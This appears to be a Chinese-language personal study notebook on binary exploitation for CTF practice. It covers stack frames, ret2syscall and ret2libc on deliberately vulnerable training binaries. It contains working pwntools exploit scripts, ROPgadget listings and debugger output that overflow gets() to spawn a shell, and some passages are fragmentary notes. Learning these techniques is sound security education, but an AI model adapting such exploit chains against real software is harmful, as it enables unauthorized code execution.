- 查 `libc` 中 `mprotect` 的偏移（如 `0xe0000`）
- 得到真实地址：`libc_base + offset_mprotect`
```

### 步骤 4️⃣：构造 ROP 链（x86-64）

因为 `mprotect` 需要三个参数，而 x86-64 用寄存器传参：

-   `rdi` = addr
-   `rsi` = len
-   `rdx` = prot

所以你需要找 **gadgets** 来控制这三个寄存器

```plain
pop rdx
```

### 含义：

-   从 **栈顶（** `rsp` **所指位置）** 取出一个 8 字节的值
-   将这个值 **写入** `rdx` **寄存器**
-   然后 `rsp += 8` （栈指针上移）

### 所以在构造 payload 时：

```plain
payload += p64(pop_rdx)   # 执行: pop rdx; ret
payload += p64(7)         # ← 这个 7 会被 pop 到 rdx 中！
```

执行流程：

```plain
rsp → [pop_rdx 地址]     ← 当前返回地址
      [7]                ← 下一个栈内容
      [...]
```

当 CPU 执行 `ret` 到 `pop_rdx` （即 `0x401238` ）时：

-   执行 `pop rdx` → `rdx = 7`
-   然后 `ret` → 跳转到栈上下一个地址（即 `7` 后面的内容）

生成shellcode

32位

printf(asm(shellcraft.sh()))

asm()的意思是将生成的汇编代码翻译为机械码

64位

print(shellcraft.amd64.sh() )

### vmmap

`vmmap` 命令用于显示进程的虚拟内存映射（Memory Mapping）。它类似于 Linux 下的 `cat /proc/<pid>/maps` ，可以帮助分析二进制程序在内存中的布局。

### vmmap 的作用

`vmmap` 命令会列出当前调试进程的所有内存段，包括：

-   可执行代码段（`.text` ）
-   数据段（`.data`, `.bss` ）
-   堆（Heap）
-   栈（Stack）
-   共享库（如 libc、ld 等）
-   动态分配的内存（mmap 分配）

2栈帧的父函数

2 3的父

3

ret指令

pop eip（32 位）/ pop rip（64 位，概念性描述）

## 栈帧学习

#### 操控栈状态的寄存器

sp esp rbp

bp rsp rbp

#### 指令

在调用新函数之前，把上一个函数的栈底保存在栈里面 就是previous ebp 存放的是一个指针 指向上一个函数的栈顶地址

在上是函数返回地址

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e038890e30e6295d.png)

### leave操作细节

1.先把esp移到ebp的位置

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/f2d432c1c73f5601.png)

2.pop 把previous ebp的值pop到ebp寄存器里

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d86c05d218e63b1d.png)

ebp 自动加一个字长 向上

### ret

### pop eip（32 位）/ pop rip（64 位，概念性描述） 把程序正在执行的地址变成return address

`ret` 指令的具体操作就是 `pop` 出当前栈顶的值，并将其加载到 **EIP** （程序计数器，指令指针）寄存器中，进而实现程序的跳转。简单来说， `ret` 的作用是弹出栈中的返回地址并将该地址加载到 **EIP** 寄存器，从而使得程序的控制流跳转到栈中的地址。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0c5c93dd9bc4eee5.png)

把栈顶值pop到eip里

## 四、返回导向编程

## 1\. ret2syscall

返回到系统调用：通过 ROP 设置系统调用所需寄存器，再执行系统调用指令。

什么是系统调用

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/945067ad1c4891fe.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/e481102e3ce6cf5d.png)

eax 是0xb ebx是 \[“/bin/sh/" \] 就是/bin/sh/字符串的地址 ecx是0 edx 是0

`execve` 是一种系统调用（system call）

eax 存放系统调用号

系统调用指令 int 0x80 的 int是中断

栈 栈 test代码片段

gadget|代码片段

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d1d8e72de8e6805a.png)

ROPgadget --binary ret2syscall --only "pop|ret" |head

找到我们用来实现功能的pop eax 、 pop ebx 、pop ecx

、pop edx

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d1d8e72de8e6805a.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/5bc306bdc6d37be1.png)

例题 rop

主函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

在call get下断点

```plain
EAX  0xffffd0ac ◂— 0x3
 EBX  0x80481a8 (_init) ◂— push   ebx
 ECX  0x80eb4d4 (_IO_stdfile_1_lock) ◂— 0x0
 EDX  0x18
 EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 ESI  0x0
 EBP  0xffffd118 —▸ 0x8049630 (__libc_csu_fini) ◂— push   ebx
 ESP  0xffffd090 —▸ 0xffffd0ac ◂— 0x3
 EIP  0x8048e96 (main+114) ◂— call   0x804f650
```

此断点处 EAX 保存传给 `gets` 的缓冲区 `v4` 地址，可据此计算它到 EBP 的距离。

0xffffd118-0xffffd0ac=108

32 位程序还需跨过保存的 EBP，大小为 4 字节。

(在 32 位系统中，栈上的数据是按 4 字节（即一个字）对齐的。因此，每个栈元素（比如局部变量、返回地址等）都会占据 4 字节的空间。)

偏移量是112

简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：

```plain
execve("/bin/sh",NULL,NULL)
```

其中，该程序是 32 位，所以我们需要使得

-   系统调用号，即 eax 应该为 0xb
-   第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
-   第二个参数，即 ecx 应该为 0
-   第三个参数，即 edx 应该为 0

调用execve 函数需要给eax ebx ecx edx 赋值

payload 构造细节

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/99a95ddc78c83b63.png)

下一步就是控制寄存器的值为我们的值，使用ROPgadget来找到对应的gadget pop ret

先找到 eax的

使用命令

```plain
ROPgadget --binary rop  --only "pop|ret"  |grep "eax"
```

寻找 二进制文件rop里面 pop |ret 关于eax 的gadget

```plain
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

我们选择第二个 地址就是 0x080bb196

```plain
0x080bb196 : pop eax ; ret
```

下一个就是ebx

```plain
ROPgadget --binary rop  --only "pop|ret"  |grep "ebx"
root@ubuntu:/home/ubuntu/Desktop/pwn2# ROPgadget --binary rop  --only "pop|ret"  |grep "ebx"
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

我们选择

```plain
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

地址就是 0x0806eb90

然后因为要让ebx的值是 “/bin/sh/”的地址就是0X080BE408

rodata:080BE408 aBinSh db '/bin/sh',0; DATA XREF:.data:shell↓o

```plain
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
```

然后要找到 int 80 的地址

```plain
ROPgadget --binary rop  --only "int"
root@ubuntu:/home/ubuntu/Desktop/pwn2# ROPgadget --binary rop  --only "int"
Gadgets information
============================================================
0x08049421 : int 0x80
0x080890b5 : int 0xcf
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/44191e6070dedb12.png)

就是0x08049421

`flat()` 被用来构造一个字节序列

最终脚本就是

```python
from pwn import *

sh=process("./rop")
pop_eax_ret=0x080bb196
pop_edx_ecx_ebx_ret= 0x0806eb90
binsh=0X080BE408 
int_0x80=0x08049421
payload=flat(["A"*112,pop_eax_ret,0xb,pop_edx_ecx_ebx_ret,0,0,binsh,int_0x80])
sh.sendline(payload)
sh.interactive()
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/13f5e7cafcdd6d0b.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/65eb8bfac1daf472.png)

在ret2syscall里只寻找pop ret的指令

为什么ret2syscall需要更多的test代码段

ret2text 直接就有后门函数

ret2shellcode有参数写入bss段，可以向栈上写入shellcode

前一步和之前的操作类似，计算偏移量，然后返回地址再改变

而ret2syscall目标是通过栈上的返回地址链，设置系统调用的相关寄存器（如 `eax` 、 `ebx` 、 `ecx` 、 `edx` ），然后触发系统调用指令（ `int 0x80` ）。

**ret2syscall** 需要操作多个栈上的返回地址来设置以下寄存器的值：

-   **eax**：系统调用号（比如 `execve` 或 `mmap` ）。
-   **ebx, ecx, edx**：这些寄存器需要设置为系统调用的参数。

没有一个地址可以直接获取shell 而是将程序中的代码片段组合起来，实现调用shell的目的

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2ec464493a29bda1.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/83fe06a1da75e609.png)

## 2.动态链接过程

## 3.ret2libc

libc存放于 share 共享空间

## GOT 表的核心要点

|     |     |
| --- | --- | 
| 问题  | 回答  |
| **GOT 表是什么？** | 存储外部函数真实地址的指针数组（在 `.got.plt` 中） |
| **为什么需要它？** | 实现动态链接的地址无关调用（配合 PLT） |
| **泄露 GOT 的目的是什么？** | 获取 libc 函数真实地址 → 绕过 ASLR → 计算 `system` 和 `/bin/sh` 地址 |

PLT 节保存调用外部函数的跳板代码；GOT 表项在解析完成后保存 `gets()` 在 libc 中的真实地址，PLT 再通过该表项间接跳转。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/fc29032559fd72be.png)

> `.got.plt` **是** `.got` **的子集，专门用于存放外部函数调用的最终地址。**

它是一个 **指针数组**，每个元素对应一个外部函数（如 `printf`, `puts`, `system` ），初始时指向 PLT 的 resolver 代码。

* * *

###### 为什么叫.got.plt？

-   `.got` ：Global Offset Table（全局偏移表）
-   `.plt` ：Procedure Linkage Table（过程链接表）
-   合起来表示： **PLT 使用的 GOT 表**

> 🔑 它的作用是： **在运行时存储 libc 函数的真实地址，供 PLT 跳转使用**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bd19e8ec0d65a99d.png)

foo 函数 在libc

plt节是什么

```plain
.plt 是“跳板代码”，.got.plt 是“地址缓存”
组件	作用	类型
.plt	存放跳板代码（机器指令），用于调用外部函数	代码段（可执行）
.got.plt	存放 PLT 使用的地址表项；延迟绑定前为解析器相关地址，绑定后为函数真实地址	数据区域（Full RELRO 下重定位后通常只读）
```

第一次链接 gets() 函数时，.got.plt 里面没有 libc中 gets函数的真实地址 ，而存放的是 plt表中 jmp 的地址 ，所以跳过去就会立马跳回来，然后去寻找真实的gets函数在 libc中的地址 ，动态链接器会依据重定位信息、符号表和已装载共享库完成解析。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1fac81b86d43ae8f.png)

解析完成后，动态链接器会将 `foo` 在 libc 中的真实地址写回对应 GOT 表项。

第二次再调用可以直接跳转到真实的foo地址

所以以前见过的泄露got表地址 ，然后再打溢出，就是这个意思

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/56f38172167b50cf.png)

ret2libc 泄露阶段的核心是获取某个已解析 GOT 表项中的 libc 运行时地址，再结合已知 libc 偏移推导基址。

```plain
plt   就是看plt表的地址
```

然后看

```plain
x/20x gets@plt
```

-   **所有** `xxx@plt` **（如** `gets@plt`**,** `time@plt` **）都位于同一个** `.plt` **节中**
-   它们不是“不同的节”，而是 **同一个** `.plt` **节内的不同函数 stub（存根）**
-   每个外部函数在 `.plt` 中都有一个对应的 **小段跳板代码**

### ret2libc1

```plain
╰─ checksec ret2libc1                                                               ─╯
[*] '/home/alexander/桌面/study/ret2libc1'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

**ASLR（Address Space Layout Randomization，地址空间布局随机化）** 是否启用。

源码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets(s);
  return 0;
}
```

gets 明显存在栈溢出

```c
0x08048720    bin/sh/ 的地址
c
0x08048303   system的地址
ROPgadget --binary ret2libc1 --string '/bin/sh' 
```

在 x86-32 的 cdecl 调用约定下，ROP 链应按 `system 地址 -> 伪返回地址 -> "/bin/sh" 地址` 排列。 `system` 进入时把栈顶当作自己的返回地址、把 `[esp+4]` 当作第一个参数；伪返回地址只会在 `system` 结束后使用。

```plain
from pwn import *

bin_address=0x08048720
```

对对 ，溢出的时候是往上溢出 ，因为我们需要控制 ret 而ret是最先压入栈的

-   `gets` 从 `s[0]` 开始， **向高地址方向写入** （因为输入是连续的）
-   但 **栈的高地址方向 = 栈底方向**

因为数据是倒着压入栈的

```plain
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
```

所以应该算该变量到栈底的距离

哦哦我们还弄错了一个地方

就是 我们需要找的不是 system字符串的地址

而是 `system@plt` 的地址（若程序导入了 `system` ）；真正的 libc 地址保存在对应 GOT 表项中。

```plain
: system@plt
pwndbg> break gets
pwndbg> run
pwndbg> p $ebp - &s
# 输出可能是 0x6c (108)

pwndbg> x/10x $ebp
# 你会看到：
# 0xffffd000: 0x... (old ebp)
# 0xffffcffc: 0x... (return address)
# ...
# s 地址 = $ebp - 0x6c
EBP  0xffffd028 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffcf9c —▸ 0x8048683 (main+107) ◂— mov eax, 0
在 x86-32 的 cdecl 调用约定下，函数入口处 `[esp]` 是返回地址，第一个参数位于 `[esp+4]`。

pwndbg> x/wx $esp

0xffffd050: 0xffffd020
→ 这个 0xffffd020 就是 s 的地址！
0x8048683-0x08048683
00:0000│ esp 0xffffcf9c —▸ 0x8048683 (main+107) ◂— mov eax, 0
01:0004│-088 0xffffcfa0 —▸ 0xffffcfbc —▸ 0xf7fc66d0 ◂— 0xe
02:0008│-084 0xffffcfa4 ◂— 0
03:000c│-080 0xffffcfa8 ◂— 1
04:0010│-07c 0xffffcfac ◂— 0
05:0014│-078 0xffffcfb0 —▸ 0xf7fc4570 (__kernel_vsyscall) ◂— push ecx
06:0018│-074 0xffffcfb4 ◂— 0xffffffff
07:001c│-070 0xffffcfb8 —▸ 0x8048034 ◂— push es
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────
 ► 0 0x8048430 gets@plt
   1 0x8048683 main+107
   2 0xf7d95519 __libc_start_call_main+121
   3 0xf7d955f3 __libc_start_main+147
   4 0x80484f1 _start+33
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> p $ebp - &s
No symbol "s" in current context.
pwndbg> x/wx $esp
0xffffcf9c:	0x08048683
```

单步步过 是 `` `n ` ``

单步不如是 `` `s` ``

栈对齐的要求

```plain
x86-32 的 System V ABI（应用程序二进制接口）要求：
在调用函数时，栈指针（esp）必须是 16 字节对齐的（即 esp % 16 == 0
```

距离 100 最近的 就是 108 108+4 =112

## system("/bin/sh") 会启动一个交互式 shell

这是整个 trick 成立的 **根本原因**。

当你调用：

```plain
system("/bin/sh");
```

它会：

1.  调用 `fork()` 创建子进程
2.  在子进程中执行 `/bin/sh` （通过 `execve` ）
3.  **父进程阻塞，等待 shell 退出**

> 🎯 所以： **只要你成功调用了** `system("/bin/sh")` **，shell 就已经起来了！**

`system()` 通常会等待其启动的命令解释器结束；因此在交互 shell 退出前，原漏洞程序通常仍在等待。返回后的控制流若指向无效地址则可能崩溃。

哦哦这就是 栈的后入先出原则

#### 步骤 1️⃣：函数返回时跳转到 system

-   原函数执行 `ret` → 弹出 `system_addr` → `eip = system_addr`
-   现在进入 `system` 函数

#### 步骤 2️⃣：system 获取参数

-   x86 32 位约定：参数从栈传递
-   `system` 内部读取 `[esp+4]` → 得到 `binsh_addr`
-   开始执行 `system("/bin/sh")`

#### 步骤 3️⃣：/bin/sh 启动！

-   此时你已经看到 `$` 提示符了！
-   **父进程（漏洞程序）被挂起，等待你退出 shell**

#### 步骤 4️⃣：你输入 exit 退出 shell

-   子进程结束
-   `system` 函数返回

#### 步骤 5️⃣：system 执行 ret

-   从栈顶弹出 `fake_ret` （即 `0xdeadbeef` ）
-   跳转到 `0xdeadbeef`

#### 步骤 6️⃣：程序 crash（但你不在乎！）

-   `0xdeadbeef` 不是有效代码地址
-   触发 segmentation fault

伪返回地址会在 `system` 返回时被 `ret` 取出（概念上可理解为弹入 EIP），而不是“pop esp”。

调用 `system` 时，栈长这样（从高地址 → 低地址）：

```plain
高地址
+------------------+
| 地址 of puts     | ← **system 的返回地址**
+------------------+
| "/bin/sh" 地址    | ← system 的参数
+------------------+ ← ESP（进入 system 时）
```

当 `system` 执行完，它会：

```plain
ret    ; 等价于：pop eip
```

→ 从栈顶弹出 `puts` 的地址，跳回去继续执行。

* * *

## 二、如果你不放虚假返回地址

你的 payload 可能是：

```plain
payload = b'A'*offset + p32(system_addr) + p32(binsh_addr)
```

此时栈布局变成：

```plain
高地址
+------------------+
| binsh_addr       | ← 栈顶！system 会认为这是“返回地址”
+------------------+
| ...              |
```

### 发生了什么？

1.  程序跳转到 `system`

```plain
system
```

读取参数：

```plain
mov eax, [esp+4]
```

→ 但

```plain
   [esp+4]
```

是

栈外数据

（可能是垃圾值）⚠️

-   实际上，在标准调用约定下，

```plain
system
```

期望：

```plain
 - `[esp]` = 返回地址
 - `[esp+4]` = 第一个参数
```

-   但现在 `[esp] = binsh_addr` ，所以 `[esp+4]` 是 **错误的参数**！

1.  更严重的是：当

```plain
   system
```

执行

```plain
   ret
```

时：

```plain
   ret   → pop eip → eip = binsh_addr
```

-   CPU 尝试从 `"/bin/sh"` 字符串的地址开始 **执行机器码**
-   但 `"sh\0"` 不是合法指令 → **SIGSEGV（段错误）**

> 💥 结果： **程序在** `system` **启动 shell 前就 crash 了，或者刚启动就崩，无法交互！**

因为主函数调用system函数时，需要先将子函数ret地址压入栈顶

### exp

```plain
from pwn import *
sh =process("./ret2libc1")

bin_address=0x08048720
system_address=0x8048460

payload=flat([b"a"*112,system_address,b"bbbb",bin_address])
sh.sendline(payload)
sh.interactive()
GOT 泄露只是第一步，要实现任意代码执行（如 system("/bin/sh")），你必须知道 libc 中其他函数（如 system、/bin/sh）的地址 —— 而这些地址依赖于具体的 libc 版本。

下面我们一步步拆解。

 一、GOT 泄露能告诉你什么？
GOT（Global Offset Table）中存的是 已解析的 libc 函数的真实地址。

例如：

puts("hello");
第一次调用后，GOT[puts] = &puts_in_libc

所以你可以：

leak = read_got_puts()   # 比如 0xf7e12345
 你知道了 当前进程中 puts 在 libc 中的运行时地址。

 二、但你的目标不是 puts，而是 system！
你想执行：

system("/bin/sh");
但你不知道：

system 的地址
/bin/sh 字符串的地址
而它们都在 同一个 libc 文件中。

 三、关键：地址偏移在同一个 libc 中是固定的
假设你有本地 libc 文件 libc-2.27.so，你可以查到：

符号	偏移（相对于 libc 基址）
puts	0x67e30
system	0x3d200
"/bin/sh"	0x17e0cf
那么，一旦你泄露了 puts 的真实地址（比如 0xf7e12345），就可以反推：

libc_base = leak_puts - 0x67e30
system_addr = libc_base + 0x3d200
binsh_addr = libc_base + 0x17e0cf
 这样你就得到了 system 和 /bin/sh 的地址！
```

## 4.ROP

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6ef9cfd245a7d9d6.png)

思考：

#### 什么是bss段

BSS段主要包含程序中声明但未显式初始化的全局变量和静态变量

#### 什么是libc

是C动态链接库，为什么libc可以绕过NX保护

因为ret2libc不依赖于注入代码执行，而是调用libc里本就存在的函数

比如说

system（）

可以使用elf=ELF（“system”）

栈溢出 控制函数的返回地址执行system函数

```plain
    /bin/sh       | <- 参数：指向字符串 "/bin/sh" 的地址
+------------------+
| 返回地址         | <- system() 执行完后的返回地址（可填无效值）
+------------------+
| system() 地址    | <- 覆盖的返回地址，跳转到 system()
```

学pwn就要学习底层逻辑

## 重点还是要搞清楚C语言函数调用栈

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/7ba1ac8033fa8ddb.png)

比如

```plain
payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
```

112 是108+4 为什么加4呢，

把 system的地址覆盖到 ret 返回地址 之后为什么要在加 4个b 作为虚假的地址 然后在在把/bin/sh/ 的地址压入 栈

这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 `'bbbb'` 作为虚假的地址，其后参数对应的参数内容。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/62da626dba1c17ad.png)

这里可以看到比较关键的函数return address 和

他的低地址位置是上一个栈帧的 栈底（ebp）的 位置

因为被调用函数返回之后需要恢复 父函数栈底指针

在向下看就是我们的局部变量区 local variables 就是我们gets / read 函数读入的参数，比如说 gets（b）

就是我们栈溢出的入口

## ret2libc2

```plain
pwndbg> plt
Section .plt 0x8048440-0x8048500:
0x8048450: printf@plt
0x8048460: gets@plt
0x8048470: time@plt
0x8048480: puts@plt
0x8048490: system@plt
0x80484a0: __gmon_start__@plt
0x80484b0: srand@plt
0x80484c0: __libc_start_main@plt
0x80484d0: setvbuf@plt
0x80484e0: rand@plt
0x80484f0: __isoc99_scanf@plt
```

plt 节 有个 system函数的地址是

`` `0x8048490` `` 不知道能不能使用

```plain
0x8048460: gets@plt
0x8048490: system@plt
```

先计算一下 s到栈底的距离把

```plain
64h  那就还是112
```

但是没有 /bin/sh 了怎么办

写入一个？

我们看看能不能找到 /bin/sh/

```plain
ROPgadget --binary ret2libc2 --string '/bin/sh' 
```

没有找到

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1e482d9858826c12.png)

所以需要我们控制两次

第一次控制程序读取字符串

第二次控制执行 system(/bin/sh)

```plain
高地址
+------------------+
| buf2             | ← system 的参数（"/bin/sh" 地址）
+------------------+
| fake_ret bbbb    | ← system 的返回地址（随便填）
+------------------+
| system_plt       | ← 跳转到 system@plt
+------------------+
| buf2             | ← gets 的参数（缓冲区地址）
+------------------+
| pop_ebx         | ← ROP gadget: pop ebx; ret
+------------------+
| get_plt          | ← 跳转到 gets@plt
+------------------+
| ret              | ← 原来的返回地址（被覆盖）
+------------------+
| ...              | ← 局部变量 s[100] 等
+------------------+  ← ebp 指向这里
低地址
```

`pop_ebx; ret` 在这条 32 位 ROP 链中主要用于清理 `gets` 的一个栈参数并继续执行下一地址。 `system` 的第一个参数仍通过栈传递，而非 EBX。

> `pop_ebx; ret` 会消耗栈上的一个字（此处是 `gets` 的参数 `buf2` ），随后 `ret` 跳转到 `system@plt` 。EBX 的具体值在此链中不是 `system` 的参数。

`buf2` **必须放在** `gets_plt` **之后**，这样当 `gets` 执行时，它就能从 `[esp]` 读到 `buf2`

`pop ebx; ret` **执行时，会把** `buf2` **（即** `s + 120` **处的那个）弹入** `ebx` **。**

`pop ebx; ret` **会将** `pop_ebx` **地址之后、紧邻的下一个栈值（即** `s+120` **处的** `buf2` **）弹入** `ebx` **。**

|     |     |     |
| --- | --- | --- |  
| **第一个** `buf2` | `s + 120` | 被 `pop_ebx` 弹入 `ebx` （虽然 `ebx` 没被使用，但 gadget 需要消耗它） |
| **第二个** `buf2` | `s + 132` | 作为 `system(buf2)` 的参数，即 `"/bin/sh"` 字符串的地址 |

函数返回，跳转到 `gets_plt`

-   `ret` 指令执行，从 `ebp+4` 弹出 `gets_plt`
-   CPU 跳转到 `gets@plt`
-   此时 `esp` **指向** `pop_ebx` **（s+116）**

Step 2： `gets` 执行并返回

-   `gets` 被调用，它需要一个参数
-   它会从 **当前** `esp` **指向的位置之后** 读取参数？  
    ❌ 不完全是 —— 实际上，在标准调用中，参数应在 `esp` 指向处。
-   但在这个 ROP 链中， `gets` **的参数被放在了** `pop_ebx` **之后** （s+120）
-   然而，

```plain
gets
```

执行完后，会执行

```plain
  ret
```

，此时：

-   `esp` **仍指向** `pop_ebx`
-   `ret` 弹出 `pop_ebx` 并跳转

Step 3：执行 `pop_ebx` gadget（重点来了！）

-   CPU 跳转到 `pop_ebx` （地址 `0x0804843d` ）

哦哦，我理解了 ，栈是高地址向低地址增长，也就是 main函数开辟gets函数的栈帧 也是向低地址增长，而我们的垃圾字节是为了覆盖 gets函数的栈帧，然后控制 main函数的 ret ，剩下的都在控制main函数的栈帧的内容

所以这里说的栈溢出 更准确一点说是子函数栈帧溢出

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8adc7707483225a4.png)

这条链先调用一次 `gets(buf2)` 写入 `/bin/sh` ，随后调用 `system(buf2)` ；因此交互上需要先发送 ROP 链，再发送写入 `buf2` 的字符串。

### exp

```python
from pwn import *

sh = process("./ret2libc2")

gets_plt=0x08048460
system_plt=0x8048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload=flat([b"a"*112,gets_plt,pop_ebx,buf2,system_plt,b"a"*4,buf2])

sh.sendline(payload)
sh.sendline("/bin/sh")

sh.interactive()
```

## ret2libc3

```c
pwndbg> plt
Section .plt 0x8048420-0x80484d0:
0x8048430: printf@plt
0x8048440: gets@plt
0x8048450: time@plt
0x8048460: puts@plt
0x8048470: __gmon_start__@plt
0x8048480: srand@plt
0x8048490: __libc_start_main@plt
0x80484a0: setvbuf@plt
0x80484b0: rand@plt
0x80484c0: __isoc99_scanf@plt
```

没有system.plt了

倒是有 `` `.rodata:000000000040200C 2F 62 69 6E 2F 73 68 00 command db '/bin/sh',0 ` ``

字符串

我们没有system怎么用呢

```c
checksec ret2libc3                                                      ─╯
[*] '/home/alexander/桌面/newstar/ret2libc3'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

32位

-   system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
-   即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下
-   [https://github.com/niklasb/libc-database](https://github.com/niklasb/libc-database)

这里涉及的页对齐有点复杂，但是是libc的基础

泄露的got 但是如何读 ，如何利用呢

```plain
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/alexander/桌面/newstar/ret2libc3:
GOT protection: Partial RELRO | Found 10 GOT entries passing the filter
[0x804a00c] printf@GLIBC_2.0 -> 0x8048436 (printf@plt+6) ◂— push 0 /* 'h' */
[0x804a010] gets@GLIBC_2.0 -> 0x8048446 (gets@plt+6) ◂— push 8
[0x804a014] time@GLIBC_2.0 -> 0x8048456 (time@plt+6) ◂— push 0x10
[0x804a018] puts@GLIBC_2.0 -> 0x8048466 (puts@plt+6) ◂— push 0x18
[0x804a01c] __gmon_start__ -> 0x8048476 (__gmon_start__@plt+6) ◂— push 0x20 /* 'h ' */
[0x804a020] srand@GLIBC_2.0 -> 0x8048486 (srand@plt+6) ◂— push 0x28 /* 'h(' */
[0x804a024] __libc_start_main@GLIBC_2.0 -> 0xf7d95560 (__libc_start_main) ◂— endbr32 
[0x804a028] setvbuf@GLIBC_2.0 -> 0x80484a6 (setvbuf@plt+6) ◂— push 0x38 /* 'h8' */
[0x804a02c] rand@GLIBC_2.0 -> 0x80484b6 (rand@plt+6) ◂— push 0x40 /* 'h@' */
[0x804a030] __isoc99_scanf@GLIBC_2.7 -> 0x80484c6 (__isoc99_scanf@plt+6) ◂— push 0x48 /* 'hH' */
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6f4e218076775766.png)

程序的入口是 start 而不是main

如果一个程序没有调用某个函数 ，即使存在于 libc 也不会存在于plt表的

